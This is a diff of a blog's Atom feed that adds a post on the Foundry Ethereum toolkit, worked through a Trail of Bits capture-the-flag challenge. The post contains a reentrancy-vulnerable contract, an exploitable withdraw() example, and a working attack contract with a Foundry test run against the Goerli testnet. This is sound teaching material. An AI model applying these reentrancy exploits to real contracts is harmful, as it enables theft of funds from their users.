@@ -5,7 +5,7 @@
   
   <link href="https://axucar.ca/feed.xml" rel="self" type="application/atom+xml" />
   <link href="https://axucar.ca/" rel="alternate" type="text/html" />
-  <updated>2022-09-04T19:12:44+00:00</updated>
+  <updated>2022-09-10T04:47:37+00:00</updated>
   <id>https://axucar.ca//</id>
 
   
@@ -18,6 +18,297 @@
 
   
 
+  
+  
+    <entry>
+      
+      <title type="html">Foundry for Ethereum Contracts</title>
+      
+      
+      <link href="https://axucar.ca/2022/09/09/foundryexplain/" rel="alternate" type="text/html" title="Foundry for Ethereum Contracts" />
+      
+      <published>2022-09-09T00:00:00+00:00</published>
+      <updated>2022-09-09T00:00:00+00:00</updated>
+      <id>https://axucar.ca/2022/09/09/foundryexplain</id>
+      <content type="html" xml:base="https://axucar.ca/2022/09/09/foundryexplain/">&lt;ul id=&quot;markdown-toc&quot;&gt;
+  &lt;li&gt;&lt;a href=&quot;#foundry&quot; id=&quot;markdown-toc-foundry&quot;&gt;Foundry&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#challenge-contract&quot; id=&quot;markdown-toc-challenge-contract&quot;&gt;Challenge contract&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#test-locally-using-foundry&quot; id=&quot;markdown-toc-test-locally-using-foundry&quot;&gt;Test locally using Foundry&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#deploy-to-goerli-testnet&quot; id=&quot;markdown-toc-deploy-to-goerli-testnet&quot;&gt;Deploy to Goerli testnet&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#create-keystore-account-in-geth&quot; id=&quot;markdown-toc-create-keystore-account-in-geth&quot;&gt;Create keystore account in Geth&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#using-cast-to-read--interact--sign&quot; id=&quot;markdown-toc-using-cast-to-read--interact--sign&quot;&gt;Using Cast to Read + Interact + Sign&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Below are my notes on how &lt;a href=&quot;https://book.getfoundry.sh/&quot;&gt;Foundry&lt;/a&gt; deploys and interacts with Ethereum contracts, illustrated by solving a simple Solidity challenge.
+(add summary of everything below SQPT style).&lt;/p&gt;
+
+&lt;h2 id=&quot;foundry&quot;&gt;Foundry&lt;/h2&gt;
+
+&lt;p&gt;Foundry is an Ethereum smart contract development toolkit like Hardhat, but instead of writing scripts and tests to interact with the blockchain in Javascript, they can be done in Solidity or just command-line. Foundry is made up of 3 CLI tools: forge, cast, and anvil.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;forge&lt;/code&gt; is used to compile, test, and deploy contracts&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cast&lt;/code&gt; is used to perform RPC calls, ie. send txs to the network, read from and interact with contracts&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;anvil&lt;/code&gt; is a local testnet Ethereum node like Hardhat node.&lt;/li&gt;
+  &lt;li&gt;To start a new project: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;forge init&lt;/code&gt;
+    &lt;ul&gt;
+      &lt;li&gt;creates new project &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;src,script,test,lib&lt;/code&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;To set up VS code with solidity support
+    &lt;ul&gt;
+      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;code&lt;/code&gt; will spin up VS code.&lt;/li&gt;
+      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ctrl + Shift + P&lt;/code&gt; gives Command Palette&lt;/li&gt;
+      &lt;li&gt;Search for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Extensions: install Extensions&lt;/code&gt;&lt;/li&gt;
+      &lt;li&gt;Install &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;solidity&lt;/code&gt; by Juan Blanco extensions VS code&lt;/li&gt;
+      &lt;li&gt;Run command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Preferences: Open Settings (UI)&lt;/code&gt;
+        &lt;ul&gt;
+          &lt;li&gt;set &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;solidity.packageDefaultDependenciesContractsDirectory&lt;/code&gt; as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;src&lt;/code&gt; (where &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;contracts&lt;/code&gt; folder would refer to in Hardhat)&lt;/li&gt;
+          &lt;li&gt;set &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;solidity.packageDefaultDependenciesDirectory&lt;/code&gt; as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lib&lt;/code&gt; (aka &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;node_modules&lt;/code&gt; in Hardhat)&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;challenge-contract&quot;&gt;Challenge contract&lt;/h2&gt;
+
+&lt;p&gt;The below contract is a straight-forward “capture-the-flat” challenge from Trail of Bits. The original deployment can be found &lt;a href=&quot;https://goerli.etherscan.io/address/0xcD7AB80Da7C893f86fA8deDDf862b74D94f4478E#code&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-solidity highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;pragma&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;solidity&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;0.8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;// The goal of this challenge is to be able to sign offchain a message
+// with an address stored in winners.
+&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;contract&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Challenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    
+    &lt;span class=&quot;kt&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;winners&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;exploit_me&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;winner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;lock&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+        &lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sender&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+        &lt;span class=&quot;nb&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;winners&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;winner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lock_me&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;lock&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;If you know about re-entrancy attacks (e.g. the famous DAO attack in 2016 where 3.6 million ETH tokens where drained), the vulnerability with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msg.sender.call(&quot;&quot;)&lt;/code&gt; will be the first thing to stand out. Often in a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;withdraw()&lt;/code&gt; function of a contract, funds are transferred to the requester via a low-level function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;call&lt;/code&gt; (see &lt;a href=&quot;https://solidity-by-example.org/call/&quot;&gt;details&lt;/a&gt;).&lt;/p&gt;
+
+&lt;div class=&quot;language-solidity highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;//exploitable withdraw function, via reentrancy
+&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;withdraw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sender&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}();&lt;/span&gt;
+
+    &lt;span class=&quot;c1&quot;&gt;//never resets balances mapping
+&lt;/span&gt;    &lt;span class=&quot;nb&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;failed&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; 
+    &lt;span class=&quot;n&quot;&gt;balances&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sender&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;However, sending ether to a contract via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;call&lt;/code&gt; triggers either a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;receive()&lt;/code&gt; or a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fallback()&lt;/code&gt; function in the receiving contract &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msg.sender&lt;/code&gt;, as detailed in &lt;a href=&quot;https://solidity-by-example.org/sending-ether/&quot;&gt;here&lt;/a&gt;. We could deploy a malicious contract with a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fallback()&lt;/code&gt; function which simply calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;withdraw()&lt;/code&gt; in the victim contract again, thus repeatedly re-entering the withdraw function until the victim contract is drained.&lt;/p&gt;
+
+&lt;p&gt;Switching context back to the simple challenge, all we have to do is call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lock_me()&lt;/code&gt; in an attacker contract’s fallback function.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Attack contract:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-solidity highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;pragma&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;solidity&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;0.8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;interface&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;challengeInterface&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;winners&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint256&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;external&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;returns&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;    
+    &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;exploit_me&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;winner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;external&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lock_me&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;external&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;contract&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MyAttack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;    
+    &lt;span class=&quot;c1&quot;&gt;//trail of bits challenge addr
+&lt;/span&gt;    &lt;span class=&quot;kt&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chAddress&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xcD7AB80Da7C893f86fA8deDDf862b74D94f4478E&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;challengeInterface&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;challengeContract&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;challengeInterface&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;chAddress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;fallback&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;external&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;challengeContract&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lock_me&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;attack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;external&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;challengeContract&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exploit_me&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sender&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;test-locally-using-foundry&quot;&gt;Test locally using Foundry&lt;/h2&gt;
+
+&lt;p&gt;Tests in Foundry are written in Solidity. In command-line, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;forge test&lt;/code&gt; scans through the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;test&lt;/code&gt; folder and runs all methods with names starting with “test*”. For this exercise, we use Goerli testnet. For mainnnet, just omit the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--goerli&lt;/code&gt; tag.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;We need an RPC node, so ensure our Geth node is active and running:  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;geth --goerli --http&lt;/code&gt;
+    &lt;ul&gt;
+      &lt;li&gt;To check Geth’s syncing status: in another terminal instance, run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;geth --goerli attach&lt;/code&gt;, and once attached to the Javascript console, entering &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eth.syncing&lt;/code&gt; will return either &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;false&lt;/code&gt; (good) or details about progress with current block vs. highest block&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Testing locally is crucial for debugging since we can print &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;console.log()&lt;/code&gt; statements, whereas deploying on live testnets cannot (since computation is done remotely on network of machines across the world).&lt;/p&gt;
+
+&lt;p&gt;Command: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;forge test -vvvv --rpc-url $ETH_RPC_URL&lt;/code&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;In my case, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$ETH_RPC_URL&lt;/code&gt; was &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&apos;http://localhost:3333&apos;&lt;/code&gt;
+    &lt;ul&gt;
+      &lt;li&gt;I use &lt;a href=&quot;http://axucar.ca/2022/08/03/running-geth-node/#ssh-tunneling-local-port-forwarding&quot;&gt;SSH tunnelling&lt;/a&gt; from a remote machine to my laptop so the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$ETH_RPC_URL&lt;/code&gt; is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&apos;http://localhost:3333&apos;&lt;/code&gt; instead of the usual &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;localhost:8545&lt;/code&gt;, when node is running on local machine (local port of 3333 is chosen arbitrarily)
+        &lt;ul&gt;
+          &lt;li&gt;As reminder, SSH tunnelling is done through &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh -L localhost:3333:localhost:8545 remote_machinename@remote_ip&lt;/code&gt;&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Appending &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--rpc-url $ETH_RPC_URL&lt;/code&gt; runs the tests on a forked environment at the highest synced block in the provided RPC node endpoint, simulating state changes as if contracts were deployed, without writing permanent changes to the blockchain
+    &lt;ul&gt;
+      &lt;li&gt;Optionally, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--fork-block-number &amp;lt;block_num&amp;gt;&lt;/code&gt; can also be used to further specify a precise block height, where &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;block_num&lt;/code&gt; is something like 7382818 for Goerli. This was useful for testing since the challenge contract was being modified by others (writing to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;winner&lt;/code&gt; array), and I had hard-coded a length (31) for the array in the test script.&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Below is my testing script.&lt;/p&gt;
+
+&lt;div class=&quot;language-solidity highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// File under test/Contract.t.sol
+// SPDX-License-Identifier: UNLICENSED
+&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;pragma&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;solidity&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;0.8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;forge-std/Test.sol&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;src/Attack.sol&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;contract&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ContractTest&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Test&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;challengeInterface&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;MyAttack&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;myAttack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;setUp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;//trail of bits challenge contract 
+&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;challengeInterface&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xcD7AB80Da7C893f86fA8deDDf862b74D94f4478E&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;myAttack&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MyAttack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;testExploit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;kt&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;player&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x08E1Eb1A25E7389488016a25CAcb51D169cd27a3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;vm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;startPrank&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;player&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;//sets msg.sender for contract calls; e.g. as if player is calling the contracts   
+&lt;/span&gt;                        
+        &lt;span class=&quot;n&quot;&gt;myAttack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;attack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;winners&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//should show our player
+&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;vm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stopPrank&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
